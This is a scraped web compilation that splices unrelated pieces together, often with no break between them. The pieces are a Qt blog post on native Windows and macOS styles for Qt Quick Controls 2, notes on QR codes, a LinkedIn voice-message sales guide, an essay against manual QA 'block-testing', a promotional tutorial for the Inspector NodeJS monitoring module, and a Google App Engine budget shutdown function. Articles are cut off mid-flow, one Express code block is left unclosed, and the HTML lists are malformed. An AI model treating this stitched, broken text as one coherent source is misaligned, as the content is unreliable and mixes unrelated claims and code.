<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Qt Quick Controls 1 was our first UI framework for QML. The controls were mostly written in QML without much C++. At the time, QML was still a new technology, which meant that we didn’t have enough experience with designing for performance to know what to expect. So the styling API ended up inefficient by design, with many fat delegates that used extensive amounts of JavaScript, bindings, introspection, Loaders, and QObjects for both control logic and styling. It also had a linking dependency to Qt Widgets to get native styling and Widget-based dialogs. And without the QML compiler that we have today, this all ended up as a rather slow and messy approach. When we realized that it also didn’t perform well on embedded hardware, it was time to rethink the solution. And the result was Qt Quick Controls 2.</p>
<!--more-->
<h2>Qt Quick Controls 2</h2>
<div><p>With Controls 2 the basic idea was to shift most of the implementation from QML to C++. By doing so, we aimed at slimming down the delegates as much as possible, and instead do the heavy lifting from C++. This included all the control logic, mouse, touch, event handling, API, and more. Only the visuals were left to be defined in QML. This resulted in thin delegates, less run-time overhead, less memory usage, clearer code flow, and faster execution. </p><p>But one thing that has been missing so far, is support for native desktop styling. The main motivation for Controls 2 was to achieve good performance on embedded devices, and since we had Qt Widgets for desktop, we sort of accepted that some essential desktop features were missing. We shipped styles that have open documentation (Universal, Material), and made it easy to create custom ones. But now that Controls 1 has been deprecated since Qt 5.12, and will also be excluded from the Qt 6 binary package, it’s time to work on desktop-oriented styles again.</p></div>
<h2>Native desktop styles</h2>
<div><p>In Qt 6.0, we are adding two new desktop styles to Controls 2: Windows and macOS. Unlike the existing Fusion style, which uses Qt Quick primitives, these new styles use QStyle for drawing. The reason is that it still does a good job of interfacing with “low-level” platform APIs to get true native styling. But instead of sharing QStyle with Widgets, we make an exclusive copy just for Controls. The latter might sound odd, since it’s natural to assume that sharing one codebase would be an easier approach. But the reasons are several: first of all, we don’t want to break Widgets or any 3rd party styles out there. And we cannot factor QStyle out of Widgets without breaking source compatibility. Not only does QStyle have references to Widgets all over its API, but it also uses enums and constants directly from the Widgets themselves. At the same time, we don’t want Controls to have a dependency on Widgets long into the future either.</p><p>Another reason is that we want the freedom to change the code wherever we see fit. There are many ways we can optimize the QStyle-copy going forward, to better fit the Qt Quick scene graph and the Controls styling API. One such change is that we only use QStyle for drawing the background of a control. The same background texture will be cached and reused for all controls of the same type, and scaled to the correct size with the help of a QSGNinePatchNode. The text and foreground will be rendered on top using normal QML. And for all such differences, we want to be able to implement them without being constrained or worried about keeping compatibility with Widgets. For the same reasons, the fact that we use QStyle for drawing is a private implementation detail. Controls already has a great styling API, and we don’t want to introduce and maintain a second one.</p><p>Lastly, we don’t necessarily want the native styles to look exactly like Widgets. For some controls, we use a hybrid approach, with QML to add animations and fading effects on top of the textures painted by QStyle. In the end, what we really want is for the native styles to have fluid performance, and to look as “native” as possible, and not necessarily like Widgets.</p></div>
<h2>What is ready for Qt 6.0?</h2>
<div><p>For Qt 6.0, most controls will be supported by the new desktop styles. But not all. Those that will be missing are the ones that currently don't have an implementation in QStyle from before, like Switch or RangeSlider. They are still available, but will be drawn with the Fusion style. Missing controls will gradually be supported in upcoming releases of Qt, the same with native dialogs and menus. And if we look even further, our plans include offering more desktop-centric controls that you might find in Widgets or native toolkits today.</p><p>So, still lots to do. But we see the new desktop styles as the first step of many to bring Controls on par with Widgets for desktop development over the next few years.</p></div>
<p>Below are screenshots of a Qt Quick Controls 2 application running with the new desktop styles. Note that this is still ongoing work, and any glitches will be ironed out before the final release.</p>

									<ul>
<li><span>Hara Masahiro while aboard a commuter train in Japan, had a eureka-like moment trying to get a scanner to recognize his strange little barcode. 25 years later, the U.S. still somewhat has little interest in the innovation.</span></li>
<li><span>“As the world shifts towards contactless interactions, Masahiro’s modernization of the barcode is gaining popularity and relevance. In time, it may serve to transition us toward a new reality: a fractal, digital ‘mirrorworld,’ sitting on top of our own.” — Mario Gabriele</span></li>
<li><span>Barcodes had somewhat already been created in the U.S. but they had a data storage problem. Masahiro solved the problem by creating a two-dimensional pattern instead of a one-dimensional column pattern (which we’re all familiar with).&nbsp;</span></li>
<li><span>“The result is the camera becomes the browser, and the world becomes the web. Or, something materially more like it — a corpus of changing, fluid data, queryable by a machine.” — Mario Gabriele</span></li>
<li><span>Why do QR codes matter? “Because it brings a fundamental renegotiation of spatial concepts, and the relationships between individual and object, object and world, viewer and viewed. Which is to say that when viewed through the lens of a camera, the world changes.” — Mario Gabriele</span></li>
<li><span>“When viewed through a camera, QR codes make everything purchasable — instantly — collapsing the space between impulse and action.”</span></li>
<li><span>“Once we enter the always-on reality of AR glasses, filtering will become more important. Users will want to decide which companies’ offers appear automatically, which they never want to hear from, and which should manifest conditionally. We will need a sort of AdBlock for our eyes.” — Mario Gabriele</span>
<ul>
<li><span>AD BLOCKERS FOR OUR EYES….the future is going to be crazy…..</span></li>

<p>However, the reason why not a lot of people know about it is because it’s only available in the LinkedIn mobile app. Like some of the best sales leaders in the industry have already understood, this feature can be a great opportunity to stand out and get people’s attention. </p>

<p>Does that mean that you need to open your LinkedIn mobile app whenever you want to reach out to someone? No, this is where things get interesting. To make this feature more accessible and actually leverage it, Amplemarket’s extension recently made it available in the browser! </p>

<h2 id="whatmakesthesemessagessorelevanttoanypersonsellingonlinkedin">What makes these messages so relevant to any person selling on LinkedIn? 🧐</h2>

<p>How many LinkedIn voice messages have you ever received? Probably not that many (if any). It’s a new channel that will automatically grab a person’s attention just because of its novelty - people are curious!</p>

<p>Besides, voice messages feel inherently more personal than text. The voice messages feature is something that most people are used to seeing on apps like WhatsApp or iMessage and it’s associated with something that you should pay attention to.</p>

<p>Generally speaking, you should always be considering different ways of connecting with your prospects and LinkedIn Voice Messages are a great way to stand out from the crowd and achieve much higher engagement rates.</p>

<h2 id="howcanyoubestleveragelinkedinvoicemessagesforsales">How can you best leverage LinkedIn voice messages for sales?</h2>

<p><img src="https://i.imgur.com/61xi0GP.png" alt=""></p>

<h4 id="1useitasanunconventionalfirsttouch">#1 Use it as an unconventional first touch</h4>

<p>The idea is to leverage this less conventional channel in your first touch and make a great first impression. </p>

<p><strong>Step 1: Do your research and connect with the prospect beforehand (2-3 days)</strong></p>

<p>Whenever you reach out to someone, it’s crucial that you have found potential buying intent from this prospect. If this is found, you should find some elements to personalize your message. This can range from industry, title, interests, etc they mention on the LinkedIn profile to other information you may have collected somewhere else (example: recent company news, referral by xyz, etc).</p>

<p>Note: If you’re using these voice messages in complement to an email sequence. You can use LinkedIn bulk actions on Amplemarket to quickly connect with all the prospects on that sequence.</p>

<p><img src="https://i.imgur.com/GWxs6BK.jpg" alt=""></p>

<p><strong>Step 2: Structure your voice message</strong></p>

<ul>
<li><p><strong>Be concise.</strong> Although LinkedIn allows you to send 1-minute long messages, keep your message under 30 seconds.</p></li>
<li><p><strong>Have a powerful and personalized intro (first 7-10 secs).</strong> You want to get the prospect’s attention in the first 5 seconds. Prospects don’t like to lose time with spammers, so make sure to leverage your research and personalize your message.</p></li>
</ul>

<blockquote>
  <p>“Hey {{first_name}}, I figured I’d drop you a message as I’m sure that everyone is probably texting you at this moment.”</p>
  
  <p>“Hi {{first<em>name}}, I looked at your profile and saw that you are {{title}} at {{company</em>name}}. I figured that [topic] falls into your wheelhouse.”</p>
</blockquote>

<ul>
<li><strong>Introduce your value proposition (next 15 secs).</strong> Prove that you’re worth continuing to listen to. Follow the introduction with a strong message that provides value.</li>
</ul>

<blockquote>
  <p>“We just got off a call with a client we recently helped solve [issue] for in only a matter of weeks.”</p>
  
  <p>“We’re currently helping clients with [problem<em>you</em>solve] and I was curious to see if this is also something you’ve been facing recently.”</p>
</blockquote>

<ul>
<li><strong>End with an effective call to action (5-10 secs).</strong> The end goal of your message is to get the prospect to engage with you. Make sure you offer a chance to get a reply.</li>
</ul>

<blockquote>
  <p>“I would love to schedule a call to go over this issue, would you be the best person to discuss this with?"</p>
</blockquote>

<p><strong>Step 3: Record, listen and send your message!</strong></p>

<p>When you practice, record it so you can listen to yourself. Make sure you sound conversational, not too formal nor too casual. Speak in a clear tone and don’t rush the script (even though it’s only 30 secs you’ll see that you have time to say all the relevant things you need).</p>

<p>When you're ready, <strong>hit send!</strong></p>

<p><strong>Step 4: Follow-up with text</strong></p>

<p>Prospects aren’t usually aware of this functionality, so they might be skeptical to open your voice message. Send them a personalized very short text to make sure they are prompted to open your recording. </p>

<blockquote>
  <p>“Hi {{first_name}}, just dropped a quick message over here, keen to hear back.”</p>
</blockquote>

<h4 id="2useitasasoftreminderwithinasalessequence">#2 Use it as a soft reminder within a sales sequence</h4>

<p>LinkedIn voice messages can also be used as a reminder within an ongoing sales sequence. You can have high relevancy first touch via email and follow up with a LinkedIn Voice Message that is a bit less personalized than the first touch but will get some attention points due to the novelty of the channel. </p>

<p>Additionally, when leaving a voice message you’ll be visiting the prospect’s profile which will trigger a LinkedIn notification and create another way to naturally grab the prospect’s attention.</p>

<p>Here is an example of what you could say in this situation:</p>

<blockquote>
  <p>“Hey {{first<em>name}}, I just shot you an email but figured dropping you a message to explain why I’m reaching out to you. I saw that you are {{title}} at {company</em>name}} and figured that [topic] falls into your wheelhouse. Are you the right person to discuss this with?”</p>
</blockquote>

<h4 id="3useitasanunexpectedlasttouch">#3 Use it as an unexpected last touch</h4>

<p>LinkedIn voice messages can also be used as a last resource when the prospect has been unresponsive on all the other channels. Again, the channel’s novelty will help you grab the prospect’s attention and you could also leverage the fact that you have tirelessly exhausted all the possibilities to connect with the prospect.</p>

<p>Here is an example of what you could say in this situation:</p>

<blockquote>
  <p>“Hi {{first_name}}, I thought I’d give it a last shot. We’re currently working with… Do you think this is worth a conversation?”</p>
</blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>How you do QA is probably terrible.</p>

<p>Of course I don’t know you, but most software development shops that I’ve worked on or chatted with “do QA” in a way that is pretty terrible.</p>

<p>Almost everyone does it, and almost everyone considers it a “best practice”, and yet somehow it never even got a name.  I’m going to call it “block-testing” because it’s the kind of testing that unfortunately makes continuous deployment and continuous delivery fundamentally impossible.</p>

<h3>So what is it already?!?!</h3>

<p>It’s the practice of having humans try to regression-test an entire product or some high-value subset of features across the entire product usually with the goal of finding reasons to stop it from being released.  The most extreme (worst) case of this being when a specific role exists solely for this purpose (almost always given the misnomer “QA”).</p>

<p>Just to be super-duper clear: I’m aware that almost everyone is doing block-testing.  That doesn’t mean it’s a good fit for every organization though.  If you actually want to achieve continuous deployment or continuous delivery, this is one of the big-batch operations that you’ll need to forego.</p>

<h3>What’s so bad about it?</h3>

<ul>
<li>A single manual run-through of a broad test script is slow (compared to existing automation)</li>
<li>It’s expensive (compared to good automation, over the long-term)</li>
<li>It frequently misses all but the most egregious regressions (more often than alternatives)</li>
<li>It’s antagonistic, pitting different roles at the company against each other.</li>
<li>It confuses where the responsibility for quality lies</li>
<li>There are many other possible solutions to the same problem, many of which are faster and more comprehensive.</li>
</ul>


<p>Alright a couple of those things are obvious to most people I think so let’s just dig into a couple of the less obvious ones:</p>

<h4>It’s antagonistic</h4>

<p>Hiring people whose sole purpose is to find reasons to stop a release is counter to the goals of a company that is trying to release software quickly.  Of course block-testers are actually tasked with the important goal of making sure each release is high-quality (and that’s a critical goal!), but the end result is that as block-testers, they naturally tend to optimize their role to “trying to find release-blockers”.  They’ll log other defects too of course, but those don’t have the same importance to them (or anyone else) as issues that block releases.</p>

<p>Also when you’ve got one group of people responsible for finding fault in another group’s work, you’re going to have conflict between the groups.  Engineers are going to start saying that the bug isn’t theirs or the bug isn’t “that bad”.  Testers are going to say the opposite.  Each group is going to blame the other when management wonders why releases are delayed or infrequent.  You’ll get the same finger-pointing when a defect gets through to production as well.  The ensuing arguments are a massive waste of time and each “side” becomes less empathetic to the other’s plight over time.</p>

<h4>It Confuses where the Responsibility for Quality Lies</h4>

<p>I’ve heard the words “You’re the tester! Test it!” a few times in my career.  The sentiment is that development and testing are distinct phases rather than something that happens iteratively during development, and “the developers do the developing and the testers do the testing”.  “This frees developers up to just focus on just development”.</p>

<p>Nothing really could be further from the truth and I have some serious doubts about the experience of any developer that thinks that they shouldn’t be testing their own work along the way as if they can hammer out 15 or more LoC and won’t have to bother to try and see if it works.  The fact of the matter is that quality is entirely the responsibility of the developer and any successful developer is testing constantly as they go.  Conversely, the tester’s only role is to assess the quality.  The tester has no responsibility whatsoever to improve it.</p>

<p>At the same time, the very presence of the tester is a very confusing signal.  It signals that the developers aren’t wholly responsible for quality (and maybe even that they’re not trusted with it!).  It diminishes their <a href="https://en.wikipedia.org/wiki/Skin_in_the_game_(phrase">skin in the game</a> ), and disincentives quality.  Of course a tester-only role has no ability to actually fix defects, and you can’t sanely hold someone responsible for something they have no control over.</p>

<p>I would wager that this division of responsibility is the single greatest cost of block-testing.  The testers and the developers start to engage in a kind of game of ping-pong where the developer tries to see what they can get past the tester, and the tester tries to find ways to block the release for any reason at all.  I’ve seen a feature go back and forth from developer to tester more than a half-dozen times before the tester agrees that it’s okay to release.  That back-and-forth often plays out over days through an issue tracker for trivially-fixed-but-important issues in high value features.  If you’re looking closely for this kind of activity you can see it all over the place, and it can look about as effective as a football team that uses telegrams to communicate mid-play.  These hand-offs are all classic waste from a <a href="https://dzone.com/articles/waste-4-handoffs">Lean perspective</a>.</p>

<p>There are many other possible solutions to ensuring quality, many of which are faster and more comprehensive.</p>

<p>Once you realize the harm, the cost, and the inadequacy of block-testing, you naturally have to ask, “but is there anything better?”.  You can’t really fault an organization for block-testing if there are no alternatives.</p>

<h3>Let’s chat about some alternatives:</h3>

<h4>Move Fast and Avoid False Dichotomies</h4>

<p>It’s really unfortunate that the industry has resolved itself to the belief that you have to either go slow or you’ll break things, and that quality and speed are an inevitable and universal trade-off.  This is a really limiting belief.</p>

<p>In order to get creative, let’s forget the “best practices” for a minute and get back to first-principles:  Here’s what we’re trying to do:</p>

<ul>
<li>We want to minimize users’ exposure to defects and outages.</li>
<li>We want to minimize the time spent between a developer completing a change on their workstation and it getting to users to keep delivery radically fast.</li>
<li>We want to catch more issues than a human can.</li>
</ul>


<h4>Preventative Measures</h4>

<p>Preventative measures are anything that you might do to prevent a defect from affecting a user.  They’re a pretty critical part of achieving goal A.</p>

<p>However, goal B means we really have to be careful what steps we put between the developer and the production environment.  Ideally they’re critically important and they’re fast.  Each of these steps has to pay for themselves.  Because of this, you have to be <em>really</em> careful about what preventative measures you choose.  Some really fast preventative measures: static-typing, automated tests, broken-link-checking spiders, linters.</p>

<h4>Mitigating Measures</h4>

<p>You also have to start thinking about how to achieve Goal A with more than just preventative measures.  Preventative measures aren’t everything.  Even the most ardent block-testers have non-preventative measures:  feedback from the end-user (even if it goes through 5 levels of support first).  I’ll call these post-deployment measures “mitigating measures”.  There are 3 main categories for the types of mitigation:</p>

<ul>
<li>Reducing the severity of a defect (# of users, impact per user, etc)</li>
<li>Finding defects faster</li>
<li>Fixing defects faster</li>
</ul>


<p>Hopefully those categories get your imagination started.  User feedback is a mitigation measure; it’s just the slowest and most expensive one.  Here are a few that do better:</p>

<ul>
<li>Fast automated deployment.  If you can’t get a fix out quickly, more users will be affected for longer than necessary.</li>
<li>Telemetry: logging, metrics, and alerts.  Instrument your codebase in as many ways as possible to make it self-report issues it might be having.  Alerts will tell you when things are going wrong faster than user-feedback and often you’ll learn about things that humans (manual testers or even end-users) did not, or even could not find.</li>
<li>One-click rollback.  Make it so that your production environment can be rolled back to the previous known-good deployment as quickly and easily as possible.</li>
<li>Staged roll-out.  Coupled with great telemetry, a gradual deployment process allows you to halt deployment and roll-back (even automatically) if there is a spike in crashes or logged errors before something is fully deployed.</li>
<li>Feature flags / Feature toggles / kill switches.  Control (post-deployment) what users get what features and when.  If there are any problems, only the allowed users are impacted, and the broken functionality is quickly reverted.</li>
</ul>


<p>Of course, you will probably want to do these things even if you never eliminate block-testing from your release process.  The prevailing practice seems to be to forego these things and expect the human block-tester will catch everything though.  That’s a kind of bury-your-head-in-the-sand quality management.</p>

<p>If you try these things out though, you’re almost certainly going to see that these practices are cheaper, faster, and more effective than block-testers though.</p>

<h4>“But Automation is Expensive!”</h4>

<p>Automation IS expensive!  I have no argument against that.  It is.  I’ve seen numerous well-covered codebases have more test code than application code, so the upfront costs of automated tests are probably close to the same as writing the application code itself.</p>

<p>Over the long haul it pays for itself though.  A well-covered codebase easily has thousands of tests each getting run thousands of times a year, so we’re talking about millions of behaviour verifications on the conservative end of things.  Humans simply cannot compete with that.  Humans are slow, and even the best of them are terrible at repetitive detail-oriented tasks.  As expensive as automation is, block-testers are even more expensive.</p>

<h4>“But developers are terrible at testing!”</h4>

<p>They’re really not.  Many haven’t had much practice because they’re working in …</p></div></div>

<h3>Have you ever desired to watch your code running, instead of just imagining it?</h3>



<p>Hi, I’m Valerio software engineer from Italy and CTO at Inspector.</p>



<p id="5148">As product owner I learned on my skin how an application issue can be so hard to fix, creating a negative impact on the users experience, or block new potential customers during on-boarding.</p>



<p id="361a">I publish new code changes almost every day and unfortunately it’s quite impossible to anticipate all the problems that could happen after every release. Furthermore users don’t spend their time to report bugs, they just stop using our application, checking for another one that fits their needs better.</p>



<p id="4b8e">In most of the projects I’ve worked on the 50% of the drawbacks for users were caused by simple code mistakes, but more the application grows the more difficult it is to avoid these incidents.</p>



<p id="7873">When I started to share my idea behind Inspector I realized that many developers know the problem:&nbsp;<strong>they spend a lot of time to investigate strange behaviors inside their application, but they didn’t know that there’s a solution to eliminate this complexity in two minutes, avoiding customer complaints or even the loss of the customer.</strong></p>



<p id="51d3">Be the first to know if my application is in trouble “<strong>before</strong>” users stumble onto the problem, drastically reduce the negative impact on their experience, giving me the right foundation to run a successful users acquisition process and to continually increase engagement with less interruptions as possible.</p>



<p id="16c1">Inspector is an npm module to add real-time code execution monitoring to your NodeJS application, allowing you to work on continuous code changes while catching bugs and bottlenecks at a glance before users do.</p>



<p>In this article I’ll use Express framework to build code snippets, but you are free to use Inspector in any Nodejs script.</p>



<h2>NodeJS Code Execution Monitoring: how it works</h2>



<p>It takes less than one minute to get started. Let me show you how it works.</p>



<h3>Install Inspector</h3>



<p>Run the npm command below in your terminal:</p>



<pre><code lang="bash">npm install @inspector-apm/inspector-nodejs --save</code></pre>



<h3>Configure the Ingestion Key</h3>



<p>Get a fresh Ingestion key by signing up for Inspector (<a rel="noreferrer noopener" href="https://app.inspector.dev/register" target="_blank">https://app.inspector.dev/register</a>) and create a new project,&nbsp;it&nbsp;takes&nbsp;just a few&nbsp;seconds.</p>



<p>You’ll see installation instructions directly in the app screen:</p>



<figure><img loading="lazy" width="1024" height="611" src="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png" alt="" srcset="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png 1024w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-300x179.png 300w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-768x459.png 768w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app.png 1395w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//www.inspector.dev/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png" data-srcset="https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-1024x611.png 1024w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-300x179.png 300w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app-768x459.png 768w, https://www.inspector.dev/wp-content/uploads/2020/11/express.docs-app.png 1395w"></figure>







<h3>Initialization</h3>



<p>To monitor the code execution in real time you need to do just two steps:</p>



<ol><li>Initialize Inspector before you require any other modules in your application – i.e. before <code>express</code>, <code>http</code>, <code>mysql</code>, etc.</li><li>Attach the <code>expressMiddleware()</code> to your express app.</li></ol>



<pre><code lang="javascript">/* -------------------------------------------
 * Initialize Inspector with the Ingestion Key.
 --------------------------------------------- */
const inspector = require('@inspector-apm/inspector-nodejs')({
  ingestionKey: 'xxxxxxxxxxxxx',
})

const app = require('express')()

/* -----------------------------------------------
 * Attach the middleware to monitor HTTP requests fulfillment.
 ------------------------------------------------- */
app.use(inspector.expressMiddleware())

app.get('/', function (req, res) {
    inspector.reportException(new Error('My first Error!'));
    return res.send('Home Page!')
})

app.get('/posts/:id', function (req, res) {
    return res.send('Single Post Details!')
})

app.listen(3006)</code></pre>



<p>That’s it.</p>



<h2>Navigate your application</h2>



<p>Now when your application receive a request Inspector automatically detect the most important events and create a visual representation of what’s happening inside your application during its normal operation, keeping an eye on code execution..</p>



<p>Launch the app with <code><strong>node app.js</strong></code> command, and navigate it in the browser on <strong><code>http://localhost:3006</code></strong>.</p>



<p>Instantly you will see transaction streams in your dashboard and for each transaction you can monitor what your application is executing in real-time:</p>

<h3 id="9cbd">Enrich your timeline</h3>



<p id="d444">Inspector monitors database query, with many type of driver (mysql2, postgre, mongodb) by default, but there might be many critical statements in your code that needs to be monitored in terms of performance and errors:</p>



<ul><li>Algorithms</li><li>Function that deals with files (pdf, excel, images)</li></ul>



<p id="656e"><strong>Thanks to our module you can add custom segments in your timeline in addition to those detected by default, to measure the impact that an hidden code block has on a transaction’s performance.</strong></p>



<p id="5739">Let me show you a real life example.</p>



<p id="b5d0">Suppose you have a function that export data from the database in a csv file.</p>



<pre><code lang="javascript">app.get('/export', function (req, res) {
    connection.query(
        'SELECT * FROM users',
        function (err, results, fields) {
           res.download(
               ExportService.createCsv(results)
           )
        }
    )
})</code></pre>



<p>The query will be automatically detected by Inspector but <strong>it could be interesting to monitor and measure the execution of the exprot function and activate alerting if somethings goes wrong.</strong> Here you can create a custom segment to add the file export statement in your timeline and monitor its impact on the request fulfillment over time.</p>



<pre><code lang="javascript">app.get('/export', function (req, res) {
    connection.query(
        'SELECT * FROM users',
        function (err, results, fields) {

           // Add the export procedure to the timeline
           inspector.addSegment(() =&gt; {
              return ExportService.createCsv(results)
           }, 'export').then(file =&gt; {
              res.download(file)
           })

        }
    )

<h3 id="edc9">Errors &amp; Exceptions Alerting</h3>



<p id="479c"><strong>By default, every exception fired in your Nodejs app will be reported automatically to be sure you’re alerted for unpredictable errors in real time.</strong></p>



<p id="695e">I wish that every change I make to my code could be perfect. But the reality is, this is not always the case. Some errors appear immediately after an update, while others pop up unpredictably. It’s an unfortunate fact of life for developers which often also depends on problems caused by the connection between our application and other services.</p>



<p id="3a9c">However, Inspector makes the job easier. It automates the detection of unknown issues so I no longer need to manually check the status of my apps continuously&nbsp;or&nbsp;wait&nbsp;reports&nbsp;directly&nbsp;from&nbsp;users. If something goes wrong It will send a notification in real time, and after each release I can stay informed about the impact of the latest code refactor.</p>



<p id="6d48">If your code fires an exception but you don’t want to block the execution, you can report the error to inspector manually for personal monitoring.</p>



<pre><code lang="javascript">try {   

    // Your dangerous external call here...

} catch (e) {
   inspector.reportException(e)
}</code></pre>



<p>Furthermore, if the export method fails, you will be alerted in real time in your inbox to take a look at the error as it appears.</p>

<p>You even get access to detailed information gathered by Inspector in real time:</p>

<h3 id="871c">Conclusion</h3>



<p id="1186">When a customer reports to you that something isn’t working, it forces you to drop whatever you are doing and start trying to reproduce the scenario, then recapture and reanalyze the logs in your own toolset.</p>



<p id="c15f">Getting a true picture of what’s happening can require hours or, based on my experience, even days. Inspector can make a huge difference in terms of efficiency, productivity&nbsp;and&nbsp;customers&nbsp;happiness.</p>



<p id="5fa8">By delegating bug discovery to an automatic&nbsp;<strong>NodeJs monitoring tool</strong>, it makes 90% of the work behind the scene, and you can solve issues before users even know about them.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div>
<p>A common worry for businesses especially small/one-person SaaS entities whose App is deployed on Google Cloud (Google App Engine - GAE) is getting a spike in their bill. This can happen when there is a sudden &amp; unexpected traffic increase to your site (this is actually not uncommon&nbsp;because of the hits to unauthorized/non-existent&nbsp;urls on your site from spammy locations). With the new requirement from GAE that requires you to have a credit card on file to deploy your App, you could potentially&nbsp;find yourself going from a bill of $0/Month&nbsp;(because you're within the daily free tier and your App is automatically shut down when you exhaust it) to a bill of tens of&nbsp;thousands of dollars.</p>

<p>Spending Limits prevented this bill spike.&nbsp;You set a figure (a cutoff or maximum amount) and when your bill reached&nbsp;that amount (approximately), your application was automatically disabled by Google thus preventing you from accruing costs. This was only applicable to Applications in Standard Environment (GAE has 2 environments - Standard and Flexible).</p>

<p>Older App Engine apps could create spending limits in the standard environment to specify an approximate maximum amount you can be charged for using App Engine resources. ....<a href="https://cloud.google.com/appengine/pricing#spending_limit" target="_blank">Source</a></p>

<p>However, Google has now deprecated Spending Limits.</p>

<p>Spending limits are deprecated. As of December 12, 2019, you can no longer create new spending limits, and existing spending limits will be removed on on July 24, 2021. For information about other mechanisms to manage costs, see managing costs. ....<a href="https://cloud.google.com/appengine/pricing#spending_limit" target="_blank">Source</a></p>

<p>But don't despair. There is a way to essentially recreate spending limits and we believe this method will also work for Flexible environment (<u>we haven't tested this</u>). To control your spending</p>

<ol><!-- style="padding: 1rem;" -->
	<li>Create a budget</li>
	<li><a href="https://cloud.google.com/appengine/docs/managing-costs#create_budget_alerts" target="_blank">Set an alert for the budget </a> (to notify you and other billing administrator when you hit your budget or before you hit it)</li>
	<li>Set the budget alert to push a message (notification) to PubSub<sup><a href="#pubsub">1</a></sup></li>
	<li>Write a function (Cloud Function<sup><a href="#cloud_functions">2</a></sup>) to disable your App. This function will be triggered when the message (notification) arrives at the PubSub.&nbsp;</li>
</ol>

	<li>Create a budget
	<ol>
		<li>Give the budget a name</li>
		<li>Create at least 1 threshold, preferably, something lower than 100%&nbsp;because you want to be notified before you actually hit your budget so that you have time to take action before you max out your amount. Another reason is because the accumulative charges will not neccessarily meet your budget exactly i.e. if your budget is $5.00, there is no guarantee that the charges you have incurred will match exactly 5.00.</li>
		<li>Check the box for - Email alerts to billing admins and users. This simply sends you a mail. Charges will still keep on accruing.</li>
		<li>Check the box for - Connect a PubSub topic to this budget. If you don't have a pubsub topic, click on the 'Create A Topic' button.</li>
	</ol>
	</li>
	<li>Enable the following APIs which are both needed to run the Cloud Function you will create in the next step (<a href="https://console.cloud.google.com/apis/library" target="_blank">Console &gt; APIs &amp; Services &gt; Library</a>)
	<ol>
		<li>App Engine Admin API</li>
		<li>Cloud Build Admin API</li>
	</ol>
	</li>
	<li>Create a cloud function (<a href="https://console.cloud.google.com/functions/list" target="_blank">Console &gt; Compute &gt; Cloud Functions</a>)
	<ol>
		<li>Pick your programming language (Python, Java, etc)</li>
		<li>If you are using Python, you can use the code below (we adapted it from the sample on Google Cloud Documentation)
		<div>
		<pre>        import base64
        import json
        import os
        from googleapiclient import discovery
        APP_NAME = os.getenv('GCP_PROJECT')


        def shutdown_app(event, context):

          """Triggered from a message on a Cloud Pub/Sub topic.
          Args:
             event (dict): Event payload.
             context (google.cloud.functions.Context): Metadata for the event.
          """

          pubsub_message = base64.b64decode(event['data']).decode('utf-8')
          pubsub_json = json.loads(pubsub_message)
          cost_amount = pubsub_json['costAmount']
          budget_amount = pubsub_json['budgetAmount']

          <span># If we are below budget, do nothing</span>
          if cost_amount &lt;= budget_amount:
            print(f'No action necessary. (Current cost: {cost_amount})')
            return

          appengine = discovery.build(
            'appengine',
            'v1',
            cache_discovery=False
          )
          apps = appengine.apps()

          <span># Get the target app's serving status</span>
          target_app = apps.get(appsId=APP_NAME).execute()
          current_status = target_app['servingStatus']

          <span># Disable target app, if necessary</span>
          if current_status == 'SERVING':
            print(f'Attempting to disable app {APP_NAME}...')
            body = {'servingStatus': 'USER_DISABLED'}
            apps.patch(appsId=APP_NAME, updateMask='serving_status', body=body).execute()
      
        </pre>
		</div>
		</li>
		<li>Under entry point, change it from "hello_pubsub" to "shutdown_app" which is the name of the function we have defined</li>
		<li>Add google-api-python-client==1.12.4 to the requirements.txt file</li>
		<li>Click the 'Deploy' button and confirm it was successful.</li>
	</ol>
	</li>
	<li>Test that your cloud function works by manually posting a message to your PubSub topic. The message will contain values which show your budget has been exceeded. If the cloud function code is correct and working, your application should become disabled.
	<ol>
		<li>Go to PubSub (<a href="https://console.cloud.google.com/cloudpubsub/topic/list" target="_blank"> Console &gt; Big Data &gt; PubSub &gt; Topics </a>)</li>
		<li>Select the topic you created when you enabled programmatic notifications while creating your budget</li>
		<li>Click on "Publish Message &gt; Publish Single Message" and enter the sample message below
		<div>
		<pre>          {
            "budgetDisplayName": "Project Budget",
            "alertThresholdExceeded": 1.0,
            "costAmount": 50.01,
            "costIntervalStart": "2020-10-01T00:00:00Z",
            "budgetAmount": 50.00,
            "budgetAmountType": "SPECIFIED_AMOUNT",
            "currencyCode": "USD"
          }
        </pre>
		</div>
		</li>
		<li>Click the Publish button</li>
		<li>Go back to the App Engine Settings Page. Your App should now be disabled. If it is not, wait a few seconds and refresh the page or go the logs to see if there was an error.</li>
	</ol>
	</li>
</ol>



<div>
<ol><!-- style="padding: 1rem;" -->
	<li><a id="pubsub"></a> <a href="https://cloud.google.com/pubsub/docs/overview" target="_blank">PubSub</a> is an infrastructure for sending and receiving messages without having to wait for the message to arrive. Think of it like Instant Messaging. When you are chatting with someone, their messages will always come to your chat window once they send it. You don't have to sit there waiting for it. PubSub allows an entity to send messages to a channel (called topic) and allows another entity to listen to that channel (subscribe to the channel) and see those messages when they arrive.

	<p>When you hit your budget threshold (e.g. 95% of your budget), the system will generate a message which is sent to a channel (the PubSub topic). Your Cloud Function code will listen to that channel (it is subscribed to the topic) and when the message arrives, it initiates the shut down of your application.</p>
	</li>
